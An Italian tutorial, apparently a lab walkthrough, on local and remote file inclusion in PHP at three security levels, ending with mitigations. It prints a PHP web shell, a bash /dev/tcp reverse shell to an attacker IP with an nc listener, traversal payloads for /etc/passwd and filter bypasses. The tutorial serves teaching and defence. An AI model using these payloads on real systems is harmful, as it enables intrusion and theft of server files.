📁 File Inclusion Vulnerabilities

LFI e RFI: includere file locali o remoti per compromettere applicazioni web

📖 Cos'è la File Inclusion?

Definizione

Le vulnerabilità di File Inclusion si verificano quando un'applicazione permette agli utenti di specificare quale file caricare, senza validazione adeguata. Esistono due tipi principali:

  • LFI (Local File Inclusion): Inclusione di file presenti sul server
  • RFI (Remote File Inclusion): Inclusione di file da server remoti

Impatto delle Vulnerabilità

  • 📄 Lettura di file sensibili: /etc/passwd, /etc/shadow, file di configurazione
  • 💣 Remote Code Execution: Esecuzione di codice arbitrario sul server
  • 🔓 Accesso a credenziali: Database passwords, API keys
  • 🎯 Information Disclosure: Codice sorgente, struttura directory

Low Security Vulnerabilità e Sfruttamento

⚠️ Vulnerabilità: Il parametro page nell'URL viene utilizzato direttamente per caricare file senza alcuna validazione.

Codice Vulnerabile (Concettuale):

$file = $_GET['page'];
include($file);

🎯 Attacco LFI: Directory Traversal

Utilizzando la sequenza ../ possiamo risalire la struttura delle directory e accedere a file al di fuori della directory web.

Payload:

http://target/vulnerabilities/fi/?page=../../../../../../etc/passwd

💡 Spiegazione:

Ogni ../ sale di un livello nella gerarchia delle directory. Ripetendo la sequenza abbastanza volte, raggiungiamo la root (/) e poi possiamo accedere a qualsiasi file:

  • /etc/passwd - Lista utenti del sistema
  • /etc/shadow - Password hash (se readable)
  • /var/www/html/config.php - File di configurazione
  • /var/log/apache2/access.log - Log del web server

🎯 Attacco RFI: Remote Code Execution

Se PHP ha allow_url_include=On, possiamo includere file da server remoti.

Procedura:

  1. Creare file malevolo sul nostro server: 
    // shell.php
<?php system($_GET['cmd']); ?>
  2. Avviare server HTTP: 
    python3 -m http.server 8000
  3. Includere il file remoto: 
    http://target/vulnerabilities/fi/?page=http://192.168.1.100:8000/shell.php
  4. Eseguire comandi: 
    http://target/vulnerabilities/fi/?page=http://192.168.1.100:8000/shell.php&cmd=whoami

💡 Ottenere una Reverse Shell:

// Listener sulla macchina attaccante
nc -lvnp 4444

// Payload nel file remoto
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"); ?>

Medium Security Protezioni Implementate

🛡️ Nuove Difese: Uso di str_replace() per rimuovere http://, https://, ../ e ..\

Codice di Protezione:

$file = $_GET['page'];
$file = str_replace(array("http://", "https://"), "", $file);
$file = str_replace(array("../", "..\\"), "", $file);
include($file);

🎯 Bypass LFI: Nested Encoding

La funzione str_replace() esegue una sola passata. Possiamo annidare i pattern per bypassarla.

Payload:

..././..././..././..././..././..././etc/passwd

💡 Come Funziona:

Quando str_replace() rimuove ../ da ..././, rimane ../! La stringa si ricompone nel pattern originale.

Prima della sostituzione: ..././
Dopo la sostituzione: ../ (il pattern centrale viene rimosso)

🎯 Bypass RFI: Nested Protocol

Payload:

hthttp://tp://192.168.1.100:8000/shell.php

💡 Risultato:

str_replace("http://", "", "hthttp://tp://") produce http://

High Security Protezioni Avanzate

🛡️ Difese Implementate: Il file deve iniziare con "file" ed essere "include.php"

Codice di Validazione:

$file = $_GET['page'];
if (!fnmatch("file*", $file) && $file != "include.php") {
    echo "ERROR: File not found!";
    exit;
}
include($file);

🎯 Bypass LFI: File Protocol

Possiamo usare il protocollo file:// per leggere file locali:

Payload:

file:///etc/passwd

💡 Spiegazione:

Il payload inizia con "file" (soddisfa la condizione fnmatch("file*", $file)) e il protocollo file:/// permette di accedere a file locali assoluti.

❌ RFI bloccato: Non possiamo più usare http:// o https://

🛡️ Strategie di Mitigazione

1. Evitare Input Utente per File Path

La miglior difesa è NON permettere agli utenti di specificare file da caricare.

// INVECE DI QUESTO (vulnerabile)
$page = $_GET['page'];
include($page . '.php');

// USA QUESTO (sicuro)
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';
if (in_array($page, $allowed_pages)) {
    include($page . '.php');
} else {
    include('404.php');
}

2. Whitelist di File Permessi

  • Mantenere array di file permessi
  • Usare mappatura ID → filename invece di filename diretto
  • Mai permettere path relativi o assoluti dall'utente

3. Validazione Rigorosa

  • Usare basename() per rimuovere path
  • Validare estensione file con whitelist
  • Verificare che il file esista nella directory permessa
  • Usare realpath() e verificare che inizi con directory base
$base_dir = '/var/www/html/includes/';
$file = basename($_GET['file']);
$full_path = realpath($base_dir . $file);

if (strpos($full_path, $base_dir) !== 0) {
    die('Invalid file path');
}
include($full_path);

4. Configurazione PHP Sicura

  • allow_url_include = Off - Disabilita inclusione URL remoti
  • allow_url_fopen = Off - Se non necessario
  • open_basedir - Limita accesso file a directory specifiche
  • disable_functions - Disabilita funzioni pericolose
; php.ini
allow_url_include = Off
allow_url_fopen = Off
open_basedir = /var/www/html/
disable_functions = exec,passthru,shell_exec,system,proc_open,popen

5. Web Application Firewall (WAF)

  • Rilevare pattern di directory traversal (../, ..%2f)
  • Bloccare accesso a file sensibili (/etc/passwd, .env, config.php)
  • Rate limiting per rilevare scanning automatico

6. Principle of Least Privilege

  • Web server con permessi minimi
  • File sensibili non leggibili dal processo web
  • Usare SELinux/AppArmor per controllo accessi

📌 Riepilogo

Le File Inclusion vulnerabilities permettono di leggere file sensibili o eseguire codice remoto. La difesa richiede whitelist rigorose, validazione path, e configurazione PHP sicura. Mai fidarsi dell'input utente per file path!
